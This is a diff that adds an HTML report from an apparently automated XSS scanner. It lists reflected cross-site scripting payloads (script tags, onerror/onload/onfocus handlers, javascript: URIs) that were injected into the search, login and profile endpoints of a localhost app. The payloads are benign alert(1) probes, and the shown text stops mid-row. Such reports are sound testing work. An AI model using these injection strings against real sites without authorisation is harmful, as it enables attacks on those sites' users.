@@ -1,0 +1,997 @@
+
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>XSS Vulnerability Scan Report</title>
+            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+            
+        <style>
+            :root {
+                --bg-dark: #0b0c10;
+                --bg-card: #1f2833;
+                --text-main: #c5c6c7;
+                --accent-cyan: #66fcf1;
+                --accent-teal: #45a29e;
+                --badge-get: #ffc107;
+                --badge-post: #dc3545;
+            }
+            body {
+                background-color: var(--bg-dark);
+                color: var(--text-main);
+                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                padding: 20px;
+            }
+            .container {
+                max-width: 1200px;
+                margin: 0 auto;
+            }
+            .header {
+                text-align: center;
+                margin-bottom: 40px;
+                border-bottom: 2px solid var(--accent-teal);
+                padding-bottom: 20px;
+            }
+            .header h1 {
+                color: var(--accent-cyan);
+                text-transform: uppercase;
+                letter-spacing: 2px;
+            }
+            .stats-card {
+                background-color: var(--bg-card);
+                border-left: 5px solid var(--accent-cyan);
+                padding: 20px;
+                border-radius: 5px;
+                margin-bottom: 30px;
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+            }
+            table {
+                width: 100%;
+                border-collapse: collapse;
+                background-color: var(--bg-card);
+                border-radius: 8px;
+                overflow: hidden;
+                box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            }
+            th {
+                background-color: #121212;
+                color: var(--accent-cyan);
+                padding: 15px;
+                text-align: left;
+                font-weight: bold;
+                text-transform: uppercase;
+                font-size: 0.9rem;
+            }
+            td {
+                padding: 15px;
+                border-bottom: 1px solid #2c3e50;
+                vertical-align: top;
+            }
+            tr:hover {
+                background-color: rgba(102, 252, 241, 0.05);
+            }
+            .payload-box {
+                background-color: #000;
+                color: #0f0;
+                padding: 10px;
+                border-radius: 4px;
+                font-family: 'Courier New', monospace;
+                font-size: 0.85rem;
+                word-break: break-all;
+                border: 1px solid #333;
+            }
+            .method-badge {
+                padding: 5px 10px;
+                border-radius: 4px;
+                font-weight: bold;
+                font-size: 0.8rem;
+                color: #000;
+                display: inline-block;
+            }
+            .url-text {
+                color: #fff;
+                text-decoration: none;
+            }
+            .url-text:hover {
+                color: var(--accent-cyan);
+                text-decoration: underline;
+            }
+            .severity-high { color: #ff4d4d; font-weight: bold; }
+            .severity-medium { color: #ffbf00; font-weight: bold; }
+            
+            /* New Styles for Alignment */
+            .meta-info {
+                display: flex;
+                flex-direction: column;
+                gap: 6px; /* Spacing between badge and text */
+                align-items: flex-start;
+            }
+            .meta-text {
+                font-size: 0.9rem;
+                line-height: 1.4;
+                margin: 0;
+            }
+        </style>
+        
+        </head>
+        <body>
+
+        <div class="container">
+            <div class="header">
+                <h1><i class="fas fa-bug"></i> XSS Vulnerability Report</h1>
+                <p style="color: var(--accent-teal);">Automated Security Scan Results</p>
+            </div>
+
+            <div class="stats-card">
+                <div>
+                    <h2 style="margin:0;">Total Findings: 60</h2>
+                    <span style="font-size: 0.9rem; color: #888;">Scan completed successfully</span>
+                </div>
+                <div style="text-align: right;">
+                    <i class="fas fa-shield-virus" style="font-size: 3rem; color: var(--accent-teal); opacity: 0.5;"></i>
+                </div>
+            </div>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th style="width: 40%;">Target URL</th>
+                        <th style="width: 20%;">Method & Severity</th>
+                        <th style="width: 40%;">Injected Payload</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/search</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">GET</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;script&gt;alert(1)&lt;/script&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/search</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">GET</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;img src=x onerror=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/search</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">GET</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;svg/onload=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/search</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">GET</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;body onload=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/search</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">GET</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/search</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">GET</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&#x27;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/search</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">GET</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;iframe src=javascript:alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/search</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">GET</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;details open ontoggle=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/search</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">GET</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;marquee onstart=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/search</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">GET</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;video&gt;&lt;source onerror=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/search</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">GET</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;audio src=x onerror=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/search</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">GET</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;object data=javascript:alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/search</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">GET</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;embed src=javascript:alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/search</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">GET</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;img src=1 onerror=alert(document.domain)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/search</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">GET</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/search</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">GET</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;input autofocus onfocus=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/search</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">GET</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;textarea autofocus onfocus=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/search</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">GET</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;select autofocus onfocus=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/search</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">GET</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;keygen autofocus onfocus=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/search</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">GET</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;math href=&#x27;javascript:alert(1)&#x27;&gt;CLICK&lt;/math&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/login</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-post)">POST</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;script&gt;alert(1)&lt;/script&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/login</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-post)">POST</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;img src=x onerror=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/login</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-post)">POST</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;svg/onload=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/login</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-post)">POST</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;body onload=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/login</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-post)">POST</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/login</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-post)">POST</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&#x27;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/login</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-post)">POST</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;iframe src=javascript:alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/login</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-post)">POST</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;details open ontoggle=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/login</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-post)">POST</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;marquee onstart=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/login</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-post)">POST</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;video&gt;&lt;source onerror=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/login</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-post)">POST</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;audio src=x onerror=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/login</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-post)">POST</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;object data=javascript:alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/login</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-post)">POST</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;embed src=javascript:alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/login</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-post)">POST</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;img src=1 onerror=alert(document.domain)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/login</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-post)">POST</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/login</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-post)">POST</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;input autofocus onfocus=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/login</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-post)">POST</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;textarea autofocus onfocus=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/login</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-post)">POST</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;select autofocus onfocus=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/login</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-post)">POST</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;keygen autofocus onfocus=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/login</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-post)">POST</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;math href=&#x27;javascript:alert(1)&#x27;&gt;CLICK&lt;/math&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/profile?name=test</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">URL_PARAMETER</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;script&gt;alert(1)&lt;/script&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/profile?name=test</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">URL_PARAMETER</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;img src=x onerror=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/profile?name=test</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">URL_PARAMETER</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;svg/onload=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/profile?name=test</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">URL_PARAMETER</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;body onload=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/profile?name=test</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">URL_PARAMETER</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/profile?name=test</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">URL_PARAMETER</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&#x27;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/profile?name=test</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">URL_PARAMETER</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;iframe src=javascript:alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/profile?name=test</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">URL_PARAMETER</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;details open ontoggle=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/profile?name=test</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">URL_PARAMETER</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;marquee onstart=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/profile?name=test</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">URL_PARAMETER</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;video&gt;&lt;source onerror=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/profile?name=test</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">URL_PARAMETER</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;audio src=x onerror=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/profile?name=test</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">URL_PARAMETER</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;object data=javascript:alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/profile?name=test</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">URL_PARAMETER</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;embed src=javascript:alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/profile?name=test</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">URL_PARAMETER</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;img src=1 onerror=alert(document.domain)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/profile?name=test</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">URL_PARAMETER</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/profile?name=test</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">URL_PARAMETER</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;input autofocus onfocus=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/profile?name=test</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">URL_PARAMETER</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;textarea autofocus onfocus=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/profile?name=test</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">URL_PARAMETER</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;select autofocus onfocus=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/profile?name=test</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">URL_PARAMETER</span>
+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;keygen autofocus onfocus=alert(1)&gt;</div></td>
+            </tr>
+            
+            <tr>
+                <td>
+                    <div class="url-text">http://localhost:5000/profile?name=test</div>
+                </td>
+                <td>
+                    <div class="meta-info">
+                        <span class="method-badge" style="background-color: var(--badge-get)">URL_PARAMETER</span>
